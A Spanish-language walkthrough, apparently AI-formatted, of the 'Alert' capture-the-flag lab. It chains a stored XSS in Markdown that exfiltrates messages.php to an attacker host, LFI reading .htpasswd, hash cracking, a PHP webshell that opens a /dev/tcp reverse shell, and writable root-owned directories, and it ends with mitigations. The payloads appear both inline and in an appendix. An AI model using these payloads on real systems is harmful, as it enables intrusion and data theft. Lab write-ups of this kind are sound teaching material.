# Alert

**Resumen rápido**
Realicé reconocimiento, enumeré servicios web y subdominios, exploté un XSS almacenado en la funcionalidad de subida/compartir de Markdown para exfiltrar `messages.php`. Con esa información logré LFI, leí archivos sensibles (incluyendo `.htpasswd`), crackeé la contraseña de `albert`, obtuve acceso SSH, escalé a `www-data` mediante un webshell y finalmente conseguí `root` aprovechando ficheros/configuraciones escribibles en `/opt/website-monitor`.

---

## Tabla de contenidos

* [Reconocimiento](#reconocimiento)
* [Enumeración web y subdominios](#enumeraci%C3%B3n-web-y-subdominios)
* [Explotación XSS en Markdown (exfiltración)](#explotaci%C3%B3n-xss-en-markdown-exfiltraci%C3%B3n)
* [LFI y lectura de ficheros sensibles](#lfi-y-lectura-de-ficheros-sensibles)
* [Obtención de credenciales y acceso como `albert`](#obtenci%C3%B3n-de-credenciales-y-acceso-como-albert)
* [Escalada a `www-data` mediante webshell](#escalada-a-www-data-mediante-webshell)
* [Investigación del servicio en `8080` y escritura en `/opt/website-monitor`](#investigaci%C3%B3n-del-servicio-en-8080-y-escritura-en-optwebsite-monitor)
* [Obtención de `root`](#obtenci%C3%B3n-de-root)
* [Cadena de explotación (resumen)](#cadena-de-explotaci%C3%B3n-resumen)
* [Mitigaciones recomendadas](#mitigaciones-recomendadas)
* [Appendix — comandos y scripts usados (sin cambios)](#appendix--comandos-y-scripts-usados-sin-cambios)

---

## Reconocimiento

Comando de reconocimiento inicial utilizado:

```
sudo nmap -sS -p- -vvv -Pn -n --min-rate 5000 MACHINE_IP
```

* **Qué hace:** escaneo SYN en todos los puertos (`-p-`) sin ping previo (`-Pn`) con alta tasa (`--min-rate 5000`) para acelerar la detección de servicios.
* **Resultado relevante:** puertos **22 (SSH)** y **80 (HTTP)** abiertos. HTTP es la superficie principal de ataque; además, durante la enumeración web se descubrió un subdominio `statistics.alert.htb`, que se añadió en `/etc/hosts` para resolverlo localmente.

---

## Enumeración web y subdominios

* Se realizó fuzzing de directorios y subdominios en la web.
* Se encontró `statistics.alert.htb`. Al visitarlo, la interfaz requería autenticación que no se conseguía con pruebas básicas.
* En la web principal existía la funcionalidad de **subir archivos Markdown**. Aunque otras extensiones estaban bloqueadas, el renderizador de Markdown dejaba pasar HTML/JS, permitiendo XSS almacenado.

**Observación técnica:** permitir HTML activo en el renderizado de Markdown sin sanitizar la entrada ni aplicar políticas como CSP es una fuente clásica de XSS almacenado.

---

## Explotación XSS en Markdown (exfiltración)

Se subió un archivo markdown con el siguiente payload (PoC):

```javascript
var req = new XMLHttpRequest();
req.open('GET', 'http://alert.htb/messages.php', false);
req.send();
var req2 = new XMLHttpRequest();
req2.open('GET', 'http://IP_ATACANTE:8080/?content=' + btoa(req.responseText),
true);
req2.send();
```

* **Qué hace:**

  1. El primer `XMLHttpRequest` lee `messages.php` desde el contexto del sitio vulnerable (same-origin), por lo que puede acceder a su contenido.
  2. El segundo `XMLHttpRequest` exfiltra la respuesta codificada en base64 a un servidor controlado por el atacante (`IP_ATACANTE:8080`).

* **Cómo se aprovechó:** se subió el `.md` y se compartió. Cuando el administrador revisó ese contenido, su navegador ejecutó el JS y envió la información a nuestro servidor. En los logs del atacante se recibió la base64 del contenido de `messages.php`.

Al decodificar el contenido exfiltrado se obtuvo:

```php
<h1>Messages</h1><ul><li><a href='messages.php?file=2024-03-10_15-48-
34.txt'>2024-03-10_15-48-34.txt</a></li></ul>␍
```

Esto sugiere que `messages.php` lista ficheros y acepta un parámetro `file`, lo que abre la puerta a un posible **LFI**.

---

## LFI y lectura de ficheros sensibles

Probando a apuntar `file` a rutas arbitrarias:

```
messages.php?file=../../../../../../etc/passwd
```

— la aplicación devolvió contenido del sistema de ficheros. Por tanto `messages.php` permite leer archivos locales sin una sanitización adecuada de rutas, confirmando una **vulnerabilidad LFI**.

Usando LFI se localizó el fichero de configuración del virtual host de Apache:

```
/etc/apache2/sites-available/000-default.conf
```

Dentro del fichero apareció la directiva:

```
AuthUserFile /var/www/statistics.alert.htb/.htpasswd
```

Con esto se supo dónde buscar las credenciales del vhost protegido.

---

## Obtención de credenciales y acceso como `albert`

* Leyendo `/var/www/statistics.alert.htb/.htpasswd` vía LFI se obtuvo el hash del usuario `albert`.
* Guardaste el hash y lo crackeaste con `hashcat` usando `rockyou.txt`:

```bash
hashcat -a 0 -m 1600 hash_file /usr/share/wordlists/rockyou.txt
```

* **Resultado:** contraseña `manchesterunted`.

Con ese par usuario/contraseña:

* Accediste a la interfaz administrativa del subdominio `statistics.alert.htb`.
* Iniciaste sesión SSH como `albert` y recuperaste `user.txt` en `/home/albert`.

---

## Escalada a `www-data` mediante webshell

* En `/var/www/` se observó que, aunque `albert` no tenía acceso directo a ciertos vhosts, existían directorios propiedad de `www-data` en los que sí era posible escribir.
* Subiste un webshell con este contenido (tal cual):

```php
<?php
system("bash -c 'bash -i >& /dev/tcp/10.10.16.52/4444 0>&1'")
?>
```

* Al acceder al `shell.php` desde el navegador, el servidor web (ejecutándose como `www-data`) ejecutó la llamada y obtuviste una reverse shell como `www-data`.

---

## Investigación del servicio en `8080` y escritura en `/opt/website-monitor`

* Con `www-data` inspeccionaste procesos:

```bash
ps -ef --forest
```

y filtraste conexiones/procesos relacionados con el puerto 8080:

```bash
ps -ef | grep 8080
```

* Detectaste un servicio ligado a `/opt/website-monitor`. Toda la estructura del proyecto era propiedad de `root`, pero algunos subdirectorios (por ejemplo `config`) eran **escribibles** por el usuario que controlabas.

* Buscaste rutas escribibles con:

```bash
find . -writable
```

y colocaste una reverse shell en:

```
/opt/website-monitor/config/shell.php
```

Para poder ejecutar/alcanzar esa shell desde tu equipo, creaste un túnel SSH (port forwarding):

```bash
ssh albert@alert.htb -L 8080:IP_ATACANTE:8080
```

Montaste el listener:

```bash
nc -nlvp 4444
```

Accediste al endpoint en tu máquina local que quedó forwardeado:

```
http://localhost:8080/config/shell.php
```

---

## Obtención de `root`

* Al ejecutar la reverse shell apuntando al endpoint anterior, conseguiste ejecución remota con privilegios que te permitieron finalmente leer:

```
/root/root.txt
```

---

## Cadena de explotación (resumen)

1. **Reconocimiento:** `nmap` detecta SSH y HTTP.
2. **Enumeración web:** fuzzing → `statistics.alert.htb`.
3. **XSS almacenado en Markdown:** se sube `.md` con JS que lee `messages.php` y exfiltra su contenido.
4. **LFI:** `messages.php?file=` permite leer ficheros arbitrarios.
5. **Credenciales:** lectura de `000-default.conf` → localización `.htpasswd` → crackeo del hash → SSH como `albert`.
6. **Escalada local:** ficheros/dirs escribibles en `/opt/website-monitor` (propiedad root) → colocación de webshell → `www-data`.
7. **Pivot final / root:** exponer/forwardear puerto 8080 y ejecutar shell en `config` → `root`.

---

## Mitigaciones recomendadas

* **Sanitizar y/o restringir HTML en Markdown:** usar librerías de renderizado seguras o sanitizar/filtrar HTML (por ejemplo, permitir solo subset seguro o usar un sanitizer como DOMPurify).
* **Aplicar Content Security Policy (CSP):** reducir el riesgo de XSS almacenado bloqueando la ejecución de `inline` scripts o restringiendo orígenes.
* **Validar rutas en inclusión de ficheros:** evitar incluir ficheros basados en parámetros sin normalización; usar whitelists y chequear canonical paths.
* **Proteger ficheros sensibles:** almacenar ficheros como `.htpasswd` fuera de rutas servidas por la aplicación y con permisos mínimos necesarios.
* **Revisar permisos:** no permitir escritura por usuarios no privilegiados en ficheros/directorios propiedad de `root`.
* **Usar hashing fuerte para contraseñas:** evitar hashes débiles (MD5, etc.); usar bcrypt/argon2 y añadir políticas de bloqueo ante intentos de fuerza bruta.
* **Auditoría y detección:** alertas para patrones anómalos (peticiones que exfiltran datos, accesos a rutas sensibles, cargas de ficheros con HTML/JS).

---

## Conclusión

La máquina combinó vulnerabilidades clásicas en cadena: **XSS almacenado → LFI → credenciales expuestas → permisos inseguros**. Esto permitió escalar desde la superficie web hasta `root`. La explotación fue reproducible con los pasos descritos y mostró la importancia de defensa en profundidad: sanitización, control de acceso a ficheros, y permisos correctos.

---

## Appendix — comandos y scripts usados (sin cambios)

### Nmap

```
sudo nmap -sS -p- -vvv -Pn -n --min-rate 5000 MACHINE_IP
```

### Payload XSS en Markdown

```javascript
var req = new XMLHttpRequest();
req.open('GET', 'http://alert.htb/messages.php', false);
req.send();
var req2 = new XMLHttpRequest();
req2.open('GET', 'http://IP_ATACANTE:8080/?content=' + btoa(req.responseText),
true);
req2.send();
```

### Webshell PHP (reverse shell)

```php
<?php
system("bash -c 'bash -i >& /dev/tcp/10.10.16.52/4444 0>&1'")
?>
```

### Hashcat (crackeo)

```bash
hashcat -a 0 -m 1600 hash_file /usr/share/wordlists/rockyou.txt
```

### Ver procesos (jerárquico)

```bash
ps -ef --forest
```

### Filtrar por puerto 8080

```bash
ps -ef | grep 8080
```

### Encontrar paths escribibles

```bash
find . -writable
```

### SSH port forwarding (forward puerto 8080 al atacante)

```bash
ssh albert@alert.htb -L 8080:IP_ATACANTE:8080
```

### Listener netcat

```bash
nc -nlvp 4444
```

---

Si quieres, te lo dejo como un archivo `README.md` listo para descargar o puedo formatearlo con una **tabla de evidencias** (capturas, salidas `curl`, logs) si me pasas las salidas que quieres incluir. ¿Quieres que genere el archivo `.md` y te lo prepare para descargar?
